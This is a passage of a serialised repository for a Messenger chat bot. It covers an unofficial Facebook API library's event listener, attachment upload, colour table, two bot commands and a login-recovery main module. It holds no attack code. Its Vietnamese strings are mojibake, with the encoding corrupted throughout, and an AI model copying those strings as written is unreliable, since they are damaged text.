ex;\n                                    x.type = \"unknown\";\n                                }\n                                return x;\n                            }),\n                            args: (delta.deltaMessageReply.repliedToMessage.body || \"\").trim().split(/\\s+/),\n                            body: delta.deltaMessageReply.repliedToMessage.body || \"\",\n                            isGroup: !!delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId,\n                            mentions: rmentions,\n                            timestamp: delta.deltaMessageReply.repliedToMessage.messageMetadata.timestamp,\n                            participantIDs: (delta.deltaMessageReply.repliedToMessage.participants || []).map(e => e.toString())\n                        };\n                    } else if (delta.deltaMessageReply.replyToMessageId) {\n                        return defaultFuncs\n                            .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, {\n                                \"av\": ctx.globalOptions.pageID,\n                                \"queries\": JSON.stringify({\n                                    \"o0\": {\n                                        //Using the same doc_id as forcedFetch\n                                        \"doc_id\": \"2848441488556444\",\n                                        \"query_params\": {\n                                            \"thread_and_message_id\": {\n                                                \"thread_id\": callbackToReturn.threadID,\n                                                \"message_id\": delta.deltaMessageReply.replyToMessageId.id,\n                                            }\n                                        }\n                                    }\n                                })\n                            })\n                            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                            .then((resData) => {\n                                if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n                                if (resData[resData.length - 1].successful_results === 0) throw { error: \"forcedFetch: there was no successful_results\", res: resData };\n                                var fetchData = resData[0].o0.data.message;\n                                var mobj = {};\n                                for (var n in fetchData.message.ranges) mobj[fetchData.message.ranges[n].entity.id] = (fetchData.message.text || \"\").substr(fetchData.message.ranges[n].offset, fetchData.message.ranges[n].length);\n\n                                callbackToReturn.messageReply = {\n                                    type: \"Message\",\n                                    threadID: callbackToReturn.threadID,\n                                    messageID: fetchData.message_id,\n                                    senderID: fetchData.message_sender.id.toString(),\n                                    attachments: fetchData.message.blob_attachment.map(att => {\n                                        var x;\n                                        try {\n                                            x = utils._formatAttachment({ blob_attachment: att });\n                                        } catch (ex) {\n                                            x = att;\n                                            x.error = ex;\n                                            x.type = \"unknown\";\n                                        }\n                                        return x;\n                                    }),\n                                    args: (fetchData.message.text || \"\").trim().split(/\\s+/) || [],\n                                    body: fetchData.message.text || \"\",\n                                    isGroup: callbackToReturn.isGroup,\n                                    mentions: mobj,\n                                    timestamp: parseInt(fetchData.timestamp_precise)\n                                };\n                            })\n                            .catch(err => log.error(\"forcedFetch\", err))\n                            .finally(function () {\n                                if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n                                !ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID ? undefined : (function () { globalCallback(null, callbackToReturn); })();\n                            });\n                    } else callbackToReturn.delta = delta;\n            \n                    if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n\n                    return !ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID ? undefined : (function () { globalCallback(null, callbackToReturn); })();\n                }\n            }\n            return;\n        }\n    }\n    switch (v.delta.class) {\n        case \"ReadReceipt\": {\n            var fmtMsg;\n            try {\n                fmtMsg = utils.formatDeltaReadReceipt(v.delta);\n            } catch (err) {\n                return log.error(\"L·ªói Nh·∫π\", err);\n            }\n            return (function () { globalCallback(null, fmtMsg); })();\n        }\n        case \"AdminTextMessage\": {\n            switch (v.delta.type) {\n                case \"joinable_group_link_mode_change\":\n                case \"magic_words\":\n                case \"pin_messages_v2\":\n                case \"change_thread_theme\":\n                case \"change_thread_icon\":\n                case \"change_thread_nickname\":\n                case \"change_thread_admins\":\n                case \"change_thread_approval_mode\":\n                case \"group_poll\":\n                case \"messenger_call_log\":\n                case \"participant_joined_group_call\":\n                    var fmtMsg;\n                    try {\n                        fmtMsg = utils.formatDeltaEvent(v.delta);\n                    } catch (err) {\n                        console.log(v.delta);\n                        return log.error(\"L·ªói Nh·∫π\", err);\n                    }\n                    return (function () { globalCallback(null, fmtMsg); })();\n                }\n            break;\n        }\n        //For group images\n        case \"ForcedFetch\": {\n            if (!v.delta.threadKey) return;\n            var mid = v.delta.messageId;\n            var tid = v.delta.threadKey.threadFbId;\n            if (mid && tid) {\n                const form = {\n                    \"av\": ctx.globalOptions.pageID,\n                    \"queries\": JSON.stringify({\n                        \"o0\": {\n                            //This doc_id is valid as of March 25, 2020\n                            \"doc_id\": \"2848441488556444\",\n                            \"query_params\": {\n                                \"thread_and_message_id\": {\n                                    \"thread_id\": tid.toString(),\n                                    \"message_id\": mid,\n                                }\n                            }\n                        }\n                    })\n                };\n\n                defaultFuncs\n                    .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n                    .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                    .then((resData) => {\n                        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n                        if (resData[resData.length - 1].successful_results === 0) throw { error: \"forcedFetch: there was no successful_results\", res: resData };\n\n                        var fetchData = resData[0].o0.data.message;\n\n                        if (utils.getType(fetchData) == \"Object\") {\n                            log.info(\"forcedFetch\", fetchData);\n                            switch (fetchData.__typename) {\n                                case \"ThreadImageMessage\":\n                                    (!ctx.globalOptions.selfListen &&\n                                        fetchData.message_sender.id.toString() === ctx.userID) ||\n                                        !ctx.loggedIn ?\n                                        undefined :\n                                        (function () {\n                                            globalCallback(null, {\n                                                type: \"change_thread_image\",\n                                                threadID: utils.formatID(tid.toString()),\n                                                snippet: fetchData.snippet,\n                                                timestamp: fetchData.timestamp_precise,\n                                                author: fetchData.message_sender.id,\n                                                image: {\n                                                    attachmentID: fetchData.image_with_metadata && fetchData.image_with_metadata.legacy_attachment_id,\n                                                    width: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.x,\n                                                    height: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.y,\n                                                    url: fetchData.image_with_metadata && fetchData.image_with_metadata.preview.uri\n                                                }\n                                            });\n                                        })();\n                                    break;\n                                case \"UserMessage\":\n                                    log.info(\"ff-Return\", {\n                                        type: \"message\",\n                                        senderID: utils.formatID(fetchData.message_sender.id),\n                                        body: fetchData.message.text || \"\",\n                                        threadID: utils.formatID(tid.toString()),\n                                        messageID: fetchData.message_id,\n                                        attachments: [{\n                                            type: \"share\",\n                                            ID: fetchData.extensible_attachment.legacy_attachment_id,\n                                            url: fetchData.extensible_attachment.story_attachment.url,\n\n                                            title: fetchData.extensible_attachment.story_attachment.title_with_entities.text,\n                                            description: fetchData.extensible_attachment.story_attachment.description.text,\n                                            source: fetchData.extensible_attachment.story_attachment.source,\n\n                                            image: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).uri,\n                                            width: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).width,\n                                            height: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).height,\n                                            playable: (fetchData.extensible_attachment.story_attachment.media || {}).is_playable || false,\n                                            duration: (fetchData.extensible_attachment.story_attachment.media || {}).playable_duration_in_ms || 0,\n\n                                            subattachments: fetchData.extensible_attachment.subattachments,\n                                            properties: fetchData.extensible_attachment.story_attachment.properties,\n                                        }],\n                                        mentions: {},\n                                        timestamp: parseInt(fetchData.timestamp_precise),\n                                        isGroup: (fetchData.message_sender.id != tid.toString())\n                                    });\n                                    globalCallback(null, {\n                                        type: \"message\",\n                                        senderID: utils.formatID(fetchData.message_sender.id),\n                                        body: fetchData.message.text || \"\",\n                                        threadID: utils.formatID(tid.toString()),\n                                        messageID: fetchData.message_id,\n                                        attachments: [{\n                                            type: \"share\",\n                                            ID: fetchData.extensible_attachment.legacy_attachment_id,\n                                            url: fetchData.extensible_attachment.story_attachment.url,\n\n                                            title: fetchData.extensible_attachment.story_attachment.title_with_entities.text,\n                                            description: fetchData.extensible_attachment.story_attachment.description.text,\n                                            source: fetchData.extensible_attachment.story_attachment.source,\n\n                                            image: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).uri,\n                                            width: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).width,\n                                            height: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).height,\n                                            playable: (fetchData.extensible_attachment.story_attachment.media || {}).is_playable || false,\n                                            duration: (fetchData.extensible_attachment.story_attachment.media || {}).playable_duration_in_ms || 0,\n\n                                            subattachments: fetchData.extensible_attachment.subattachments,\n                                            properties: fetchData.extensible_attachment.story_attachment.properties,\n                                        }],\n                                        mentions: {},\n                                        timestamp: parseInt(fetchData.timestamp_precise),\n                                        isGroup: (fetchData.message_sender.id != tid.toString())\n                                    });\n                            }\n                        } else log.error(\"forcedFetch\", fetchData);\n                    })\n                    .catch((err) => log.error(\"forcedFetch\", err));\n                }\n            }\n            break;\n        case \"ThreadName\":\n        case \"ParticipantsAddedToGroupThread\":\n        case \"ParticipantLeftGroupThread\": {\n            var formattedEvent;\n            try {\n                formattedEvent = utils.formatDeltaEvent(v.delta);\n            } catch (err) {\n                console.log(err);\n                return log.error(\"L·ªói Nh·∫π\", err);\n            }\n            return (!ctx.globalOptions.selfListen && formattedEvent.author.toString() === ctx.userID) || !ctx.loggedIn ? undefined : (function () { globalCallback(null, formattedEvent); })();\n        }\n        case \"NewMessage\": {\n            if (v.delta.attachments != undefined && v.delta.attachments.length == 1 && v.delta.attachments[0].mercury.extensible_attachment != undefined && v.delta.attachments[0].mercury.extensible_attachment.story_attachment.style_list.includes(\"message_live_location\")) {\n                v.delta.class = \"UserLocation\";\n                var fmtMsg;\n                try {\n                    fmtMsg = utils.formatDeltaEvent(v.delta);\n                } catch (err) {\n                    console.log(v.delta);\n                    return log.error(\"L·ªói Nh·∫π\", err);\n                }\n                return (function () { globalCallback(null, fmtMsg); })();\n            }\n        }\n        break;\n    }\n}\n\n\nfunction markDelivery(ctx, api, threadID, messageID) {\n    if (threadID && messageID) {\n        api.markAsDelivered(threadID, messageID, (err) => {\n            if (err) log.error(\"markAsDelivered\", err);\n            else {\n                if (ctx.globalOptions.autoMarkRead) {\n                    api.markAsRead(threadID, (err) => {\n                        if (err) log.error(\"markAsDelivered\", err);\n                    });\n                }\n            }\n        });\n    }\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    var globalCallback = identity;\n    getSeqID = function getSeqID() {\n        ctx.t_mqttCalled = false;\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then((resData) => {\n                if (utils.getType(resData) != \"Array\") {\n                    if (global.Fca.Require.FastConfig.AutoLogin) {\n                        return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n                            return global.Fca.Action('AutoLogin');\n                        });\n                    }\n                    else if (!global.Fca.Require.FastConfig.AutoLogin) {\n                        return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n                    }\n                    return;\n                }\n                else {\n                    if (resData && resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n                    if (resData[resData.length - 1].successful_results === 0) throw { error: \"getSeqId: there was no successful_results\", res: resData };\n                    if (resData[0].o0.data.viewer.message_threads.sync_sequence_id) {\n                        ctx.lastSeqId = resData[0].o0.data.viewer.message_threads.sync_sequence_id;\n                        listenMqtt(defaultFuncs, api, ctx, globalCallback);\n                    } \n                    else throw { error: \"getSeqId: no sync_sequence_id found.\", res: resData };\n                }\n            })\n            .catch((err) => {\n                log.error(\"getSeqId\", err);\n                if (utils.getType(err) == \"Object\" && err.error === global.Fca.Require.Language.Index.ErrAppState) ctx.loggedIn = false;\n                return globalCallback(err);\n            });\n    };\n\n    return function (callback) {\n        class MessageEmitter extends EventEmitter {\n            stopListening(callback) {\n                callback = callback || (() => { });\n                globalCallback = identity;\n                if (ctx.mqttClient) {\n                    ctx.mqttClient.unsubscribe(\"/webrtc\");\n                    ctx.mqttClient.unsubscribe(\"/rtc_multi\");\n                    ctx.mqttClient.unsubscribe(\"/onevc\");\n                    ctx.mqttClient.publish(\"/browser_close\", \"{}\");\n                    ctx.mqttClient.end(false, function (...data) {\n                        ctx.mqttClient = undefined;\n                    });\n                }\n                global.Fca.Data.StopListening = true;\n            }\n        }\n\n        var msgEmitter = new MessageEmitter();\n        globalCallback = (callback || function (error, message) {\n            if (error) return msgEmitter.emit(\"error\", error);\n            msgEmitter.emit(\"message\", message);\n        });\n\n        //Reset some stuff\n        if (!ctx.firstListen) ctx.lastSeqId = null;\n        ctx.syncToken = undefined;\n        ctx.t_mqttCalled = false;\n\n        //Same request as getThreadList\n        form = {\n            \"av\": ctx.globalOptions.pageID,\n            \"queries\": JSON.stringify({\n                \"o0\": {\n                    \"doc_id\": \"3336396659757871\",\n                    \"query_params\": {\n                        \"limit\": 1,\n                        \"before\": null,\n                        \"tags\": [\"INBOX\"],\n                        \"includeDeliveryReceipts\": false,\n                        \"includeSeqID\": true\n                    }\n                }\n            })\n        };\n\n        if (!ctx.firstListen || !ctx.lastSeqId) getSeqID();\n        else listenMqtt(defaultFuncs, api, ctx, globalCallback);\n        ctx.firstListen = false;\n        return msgEmitter;\n    };\n};","path":null,"size_bytes":42236,"size_tokens":null},"lib/fca-auto/src/threadColors.js":{"content":"\"use strict\";\n\nmodule.exports = function(_defaultFuncs, _api, _ctx) {\n  // Currently the only colors that can be passed to api.changeThreadColor(); may change if Facebook adds more\n  return {\n    ////MessengerBlue: null,\n    ////Viking: \"#44bec7\",\n    ////GoldenPoppy: \"#ffc300\",\n    ////RadicalRed: \"#fa3c4c\",\n    ////Shocking: \"#d696bb\",\n    ////PictonBlue: \"#6699cc\",\n    ////FreeSpeechGreen: \"#13cf13\",\n    ////Pumpkin: \"#ff7e29\",\n    ////LightCoral: \"#e68585\",\n    ////MediumSlateBlue: \"#7646ff\",\n    ////DeepSkyBlue: \"#20cef5\",\n    ////Fern: \"#67b868\",\n    ////Cameo: \"#d4a88c\",\n    ////BrilliantRose: \"#ff5ca1\",\n    ////BilobaFlower: \"#a695c7\"\n    DefaultBlue:    \"196241301102133\",\n    HotPink:        \"169463077092846\",\n    AquaBlue:       \"2442142322678320\",\n    BrightPurple:   \"234137870477637\",\n    CoralPink:      \"980963458735625\",\n    Orange:         \"175615189761153\",\n    Green:          \"2136751179887052\",\n    LavenderPurple: \"2058653964378557\",\n    Red:            \"2129984390566328\",\n    Yellow:         \"174636906462322\",\n    TealBlue:       \"1928399724138152\",\n    Aqua:           \"417639218648241\",\n    Mango:          \"930060997172551\",\n    Berry:          \"164535220883264\",\n    Citrus:         \"370940413392601\",\n    Candy:          \"205488546921017\",\n    StarWars:       \"809305022860427\"\n  };\n};","path":null,"size_bytes":1325,"size_tokens":null},"lib/fca-auto/src/uploadAttachment.js":{"content":"const utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\tfunction upload(attachments, callback) {\n\t\tcallback = callback || function () { };\n\t\tconst uploads = [];\n\n\t\t// create an array of promises\n\t\tfor (let i = 0; i < attachments.length; i++) {\n\t\t\tif (!utils.isReadableStream(attachments[i])) {\n\t\t\t\tthrow {\n\t\t\t\t\terror:\n\t\t\t\t\t\t\"Attachment should be a readable stream and not \" +\n\t\t\t\t\t\tutils.getType(attachments[i]) +\n\t\t\t\t\t\t\".\"\n\t\t\t\t};\n\t\t\t}\n\n\t\t\tconst form = {\n\t\t\t\tupload_1024: attachments[i],\n\t\t\t\tvoice_clip: \"true\"\n\t\t\t};\n\n\t\t\tuploads.push(\n\t\t\t\tdefaultFuncs\n\t\t\t\t\t.postFormData(\n\t\t\t\t\t\t\"https://upload.facebook.com/ajax/mercury/upload.php\",\n\t\t\t\t\t\tctx.jar,\n\t\t\t\t\t\tform,\n\t\t\t\t\t\t{}\n\t\t\t\t\t)\n\t\t\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t\t\t.then(function (resData) {\n\t\t\t\t\t\tif (resData.error) {\n\t\t\t\t\t\t\tthrow resData;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// We have to return the data unformatted unless we want to change it\n\t\t\t\t\t\t// back in sendMessage.\n\t\t\t\t\t\treturn resData.payload.metadata[0];\n\t\t\t\t\t})\n\t\t\t);\n\t\t}\n\n\t\t// resolve all promises\n\t\tPromise\n\t\t\t.all(uploads)\n\t\t\t.then(function (resData) {\n\t\t\t\tcallback(null, resData);\n\t\t\t})\n\t\t\t.catch(function (err) {\n\t\t\t\tlog.error(\"uploadAttachment\", err);\n\t\t\t\treturn callback(err);\n\t\t\t});\n\t}\n\n\treturn function uploadAttachment(attachments, callback) {\n\t\tif (\n\t\t\t!attachments &&\n\t\t\t!utils.isReadableStream(attachments) &&\n\t\t\t!utils.getType(attachments) === \"Array\" &&\n\t\t\t(utils.getType(attachments) === \"Array\" && !attachments.length)\n\t\t)\n\t\t\tthrow { error: \"Please pass an attachment or an array of attachments.\" };\n\n\t\tlet resolveFunc = function () { };\n\t\tlet rejectFunc = function () { };\n\t\tconst returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n\t\tif (!callback) {\n\t\t\tcallback = function (err, info) {\n\t\t\t\tif (err) {\n\t\t\t\t\treturn rejectFunc(err);\n\t\t\t\t}\n\t\t\t\tresolveFunc(info);\n\t\t\t};\n\t\t}\n\n\t\tif (utils.getType(attachments) !== \"Array\")\n\t\t\tattachments = [attachments];\n\n\t\tupload(attachments, (err, info) => {\n\t\t\tif (err) {\n\t\t\t\treturn callback(err);\n\t\t\t}\n\t\t\tcallback(null, info);\n\t\t});\n\n\t\treturn returnPromise;\n\t};\n};","path":null,"size_bytes":2159,"size_tokens":null},"modules/commands/contact.js":{"content":"this.config = {\n  name: \"contact\",\n  version: \"1.0.1\",\n  hasPermssion: 0,\n  credits: \"DongDev - Mod by GPT\",\n  description: \"Contact th√†nh vi√™n trong nh√≥m\",\n  commandCategory: \"C√¥ng c·ª•\",\n  usages: \"\",\n  cooldowns: 5,\n  images: []\n};\n\nthis.handleEvent = async ({ api, event }) => {\n  const { threadID, messageReply, senderID, mentions, type, body } = event;\n  if (!body) return;\n\n  if (body.trim().toLowerCase() === \"contact\") {\n    let id;\n\n    if (Object.keys(mentions).length > 0) {\n      id = Object.keys(mentions)[0].replace(/\\&mibextid=ZbWKwL/g, '');\n    } else if (type === \"message_reply\") {\n      id = messageReply.senderID;\n    } else {\n      id = senderID;\n    }\n\n    api.shareContact(\"\", id, threadID);\n  }\n};\n\nthis.run = async ({ api: { shareContact }, event: { threadID, messageReply, senderID, mentions, type }, args }) => {\n  let id = Object.keys(mentions).length > 0\n    ? Object.keys(mentions)[0].replace(/\\&mibextid=ZbWKwL/g, '')\n    : args[0] !== undefined\n      ? isNaN(args[0]) ? await global.utils.getUID(args[0]) : args[0]\n      : senderID;\n\n  if (type === \"message_reply\") id = messageReply.senderID;\n\n  shareContact(\"\", id, threadID);\n};\n","path":null,"size_bytes":1169,"size_tokens":null},"modules/commands/servermc.js":{"content":"const axios = require('axios');\n\nmodule.exports.config = {\n  name: \"servermc\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"TatsuYTB\",\n  description: \"Ki·ªÉm tra tr·∫°ng th√°i m√°y ch·ªß Minecraft\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"[ip ho·∫∑c domain]\",\n  cooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n  const ip = args[0];\n  if (!ip) return api.sendMessage(\"‚ùå Vui l√≤ng nh·∫≠p IP ho·∫∑c domain c·ªßa m√°y ch·ªß Minecraft.\", event.threadID, event.messageID);\n\n  try {\n    const res = await axios.get(`https://api.mcstatus.io/v2/status/java/${ip}`);\n    const data = res.data;\n\n    if (!data.online) return api.sendMessage(`‚ö†Ô∏è M√°y ch·ªß ${ip} hi·ªán ƒëang offline.`, event.threadID, event.messageID);\n\n    const {\n      host,\n      port,\n      ip_address,\n      version,\n      players,\n      motd\n    } = data;\n\n    const playerNames = players.list?.map(p => p.name_clean) || [];\n    let playerDisplay = \"\";\n    if (playerNames.length > 50) {\n      playerDisplay = playerNames.slice(0, 50).join(\", \") + `\\n...v√† ${playerNames.length - 50} ng∆∞·ªùi ch∆°i kh√°c.`;\n    } else if (playerNames.length > 0) {\n      playerDisplay = playerNames.join(\", \");\n    } else {\n      playerDisplay = \"Kh√¥ng c√≥ ng∆∞·ªùi ch∆°i n√†o ƒëang online.\";\n    }\n\n    const message = \n`üåê Tr·∫°ng th√°i m√°y ch·ªß Minecraft:\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüü¢ Tr·ª±c tuy·∫øn: ${data.online ? \"C√≥\" : \"Kh√¥ng\"}\nüìå Host: ${host}\nüì° IP: ${ip_address}:${port}\nüõ†Ô∏è Phi√™n b·∫£n: ${version.name_clean}\nüí¨ MOTD: ${motd.clean}\nüë• Ng∆∞·ªùi ch∆°i: ${players.online}/${players.max}\n${players.online > 0 ? `üßç Danh s√°ch: ${playerDisplay}` : \"\"}\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;\n\n    return api.sendMessage(message, event.threadID, event.messageID);\n  } catch (err) {\n    console.error(err);\n    return api.sendMessage(\"‚ùå ƒê√£ x·∫£y ra l·ªói khi l·∫•y d·ªØ li·ªáu m√°y ch·ªß. H√£y ch·∫Øc ch·∫Øn ƒë·ªãa ch·ªâ IP h·ª£p l·ªá.\", event.threadID, event.messageID);\n  }\n};","path":null,"size_bytes":2033,"size_tokens":null},"lib/fca-auto/Main.js":{"content":"'use strict';\n\n//-[ Require config and use ]-!/\n\nif (global.Fca.Require.FastConfig.Config != 'default') {\n    //do ssth\n}\nconst { exec, spawn } = require('child_process');\nconst Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;\nconst FacebookLogin = require('./Extra/Src/fblogin.js')(global.Fca);\n\n\n//-[ Require All Package Need Use ]-!/\n\nvar utils = global.Fca.Require.utils,\n    logger = global.Fca.Require.logger,\n    fs = global.Fca.Require.fs,\n    getText = global.Fca.getText,\n    log = global.Fca.Require.log,\n    express = require(\"express\")(),\n    { join } = require('path'),\n    cheerio = require(\"cheerio\"),\n    { readFileSync, writeFileSync } = require('fs-extra'),\n    Database = require(\"./Extra/Database\"),\n    readline = require(\"readline\"),\n    chalk = require(\"chalk\"),\n    figlet = require(\"figlet\"),\n    os = require(\"os\"),\n    deasync = require('deasync'),\n    Security = require(\"./Extra/Security/Base\"),\n    { getAll, deleteAll } = require('./Extra/ExtraGetThread'),\n    ws = require('ws'),\n    Websocket = require('./Extra/Src/Websocket'),\n    Convert = require('ansi-to-html');\n    \n\n//-[ Set Variable For Process ]-!/\n\nlog.maxRecordSize = 100;\nvar checkVerified = null;\nconst Boolean_Option = ['online','selfListen','listenEvents','updatePresence','forceLogin','autoMarkDelivery','autoMarkRead','listenTyping','autoReconnect','emitReady'];\n\n//-[ Set And Check Template HTML ]-!/\n\nconst css = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'style.css'));\nconst js = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'script.js'));\n\n//-[ H√†m t·∫°o giao di·ªán HTML n√¢ng c·∫•p ]-!/\nfunction ClassicHTML(UserName, Type, link) {\n    return `\n    <!DOCTYPE html>\n    <html lang=\"vi\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>Horizon FCA - Trang Th√¥ng Tin</title>\n        <link rel=\"stylesheet\" href=\"./style.css\">\n        <style>\n            body { background: linear-gradient(120deg, #232526, #414345); color: #fff; font-family: 'Segoe UI', Arial, sans-serif; }\n            .card {\n                background: rgba(40,40,40,0.92); border-radius: 14px; margin: 40px auto 0; max-width: 500px; box-shadow: 0 8px 32px 0 rgba(31,38,135,0.37);\n                padding: 32px 30px 25px 30px;\n            }\n            .card h2 { color: #00e8d4; }\n            .card h3 { color: #f2c94c; }\n            .footer { margin-top: 35px; color: #aaa; }\n            #music audio { width: 90%; border-radius: 8px; margin: 8px 0; }\n            .badge { background: #00e8d4; color: #232526; border-radius: 14px; padding: 5px 15px; font-weight: bold; letter-spacing: 1px; }\n        </style>\n    </head>\n    <body>\n        <div class=\"card\">\n            <h2>Horizon FCA - Th√¥ng Tin Ng∆∞·ªùi D√πng</h2>\n            <h3><span class=\"badge\">Ng∆∞·ªùi d√πng:</span> ${UserName}</h3>\n            <h3><span class=\"badge\">Lo·∫°i:</span> ${Type}</h3>\n            <canvas id=\"myCanvas\"></canvas>\n            <div id=\"music\">\n                <audio controls loop src=\"${link}\">Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ audio.</audio>\n            </div>\n            <div class=\"footer\">\n                <b>Session ID:</b> ${global.Fca.Require.Security.create().uuid}<br>\n                <b>H·ªá ƒëi·ªÅu h√†nh:</b> ${os.type()} ${os.platform()}<br>\n                <b>Phi√™n b·∫£n NodeJS:</b> ${process.version}<br>\n                <b>Bot:</b> FCA-Horizon-Remastered<br>\n                <b>Nh√† ph√°t tri·ªÉn:</b> <a href=\"https://fb.com/pcoder090\" style=\"color:#00e8d4\">PCoder</a>\n            </div>\n        </div>\n        <script src=\"./script.js\"></script>\n    </body>\n    </html>\n    `\n}\n\n//++++++++++ [ AUTO RECOVERY FUNCTION ] ++++++++++\nasync function handleLoginFailure() {\n    logger.Warning(\"ƒêƒÉng nh·∫≠p th·∫•t b·∫°i. ƒêang ki·ªÉm tra c√†i ƒë·∫∑t AutoLogin...\");\n    \n    if (global.Fca.Require.FastConfig.AutoLogin) {\n        logger.Normal(\"AutoLogin ƒë√£ ƒë∆∞·ª£c b·∫≠t. ƒêang c·ªë g·∫Øng t·∫°o m·ªõi appState th√¥ng qua fblogin.js...\");\n        try {\n            const loginResult = await FacebookLogin.login();\n            if (loginResult.status === true) {\n                logger.Success(\"ƒê√£ t·∫°o m·ªõi appState th√†nh c√¥ng. ƒêang kh·ªüi ƒë·ªông l·∫°i bot...\");\n\n                // ‚úÖ Kh·ªüi ƒë·ªông l·∫°i bot (ch·ªçn 1 trong 2 c√°ch d∆∞·ªõi)\n\n                // C√°ch 1: N·∫øu b·∫°n ƒëang d√πng pm2/forever ƒë·ªÉ qu·∫£n l√Ω bot\n                //process.exit(1);\n\n                // C√°ch 2: N·∫øu kh√¥ng d√πng pm2, t·ª± ƒë·ªông restart l·∫°i bot b·∫±ng l·ªánh spawn\n                const { spawn } = require('child_process');\n                spawn(process.argv[0], process.argv.slice(1), {\n                    stdio: 'inherit',\n                    detached: true\n                });\n                process.exit(0); // Tho√°t ti·∫øn tr√¨nh hi·ªán t·∫°i ƒë·ªÉ ti·∫øn tr√¨nh m·ªõi thay th·∫ø\n                \n            } else {\n                logger.Error(`ƒêƒÉng nh·∫≠p b·∫±ng fblogin.js th·∫•t b·∫°i: ${loginResult.message}. Vui l√≤ng ki·ªÉm tra l·∫°i th√¥ng tin t√†i kho·∫£n ƒë√£ l∆∞u.`);\n                process.exit(0);\n            }\n        } catch (err) {\n            logger.Error(\"ƒê√£ x·∫£y ra l·ªói kh√¥ng mong mu·ªën trong qu√° tr√¨nh ƒëƒÉng nh·∫≠p l·∫°i t·ª± ƒë·ªông.\", err);\n            process.exit(0);\n        }\n    } else {\n        logger.Error(\"ƒêƒÉng nh·∫≠p th·∫•t b·∫°i. Vui l√≤ng c·∫≠p nh·∫≠t l·∫°i appState ho·∫∑c b·∫≠t AutoLogin k√®m th√¥ng tin t√†i kho·∫£n trong file FastConfigFca.json.\");\n        process.exit(0);\n    }\n}\n\n// +++++++++++++++++++++++++++++++++++++++++++++++\n\n\n//-[ Stating Http Infomation ]-!/\n\nexpress.set('DFP', (process.env.PORT || process.env.port || 3004));\n\nexpress.use(function(req, res, next) {\n    switch (req.url.split('?')[0]) {\n        case '/script.js': {\n            res.writeHead(200, { 'Content-Type': 'text/javascript' });\n                res.write(js);\n            break;\n        }\n        case '/style.css': {\n            res.writeHead(200, { 'Content-Type': 'text/css' });\n                res.write(css);\n            break;\n        }\n        default: {\n            res.writeHead(200, \"OK\", { \"Content-Type\": \"text/html\" });\n            res.write(ClassicHTML(global.Fca.Require.FastConfig.HTML.UserName, \"Premium Access\", global.Fca.Require.FastConfig.HTML.MusicLink));\n        }\n    }\n    res.end();\n})\nvar Server;\nif (global.Fca.Require.FastConfig.HTML.HTML) {\n    Server = express.listen(express.get('DFP'))\n        .on('error', function (err) {\n            if (err.code === 'EADDRINUSE') {\n                log.error('SERVER', `Port ${express.get('DFP')} is already in use.`);\n            } else {\n                log.error('SERVER', err);\n            }\n        });\n}\n\n\nfunction setOptions(globalOptions, options) {\n    Object.keys(options).map(function(key) {\n        switch (Boolean_Option.includes(key)) {\n            case true: {\n                globalOptions[key] = Boolean(options[key]);\n                break;\n            }\n            case false: {\n                switch (key) {\n                    case 'pauseLog': {\n                        if (options.pauseLog) log.pause();\n                            else log.resume();\n                        break;\n                    }\n                    case 'logLevel': {\n                        log.level = options.logLevel;\n                            globalOptions.logLevel = options.logLevel;\n                        break;\n                    }\n                    case 'logRecordSize': {\n                        log.maxRecordSize = options.logRecordSize;\n                            globalOptions.logRecordSize = options.logRecordSize;\n                        break;\n                    }\n                    case 'pageID': {\n                        globalOptions.pageID = options.pageID.toString();\n                        break;\n                    }\n                    case 'userAgent': {\n                        globalOptions.userAgent = (options.userAgent || 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like 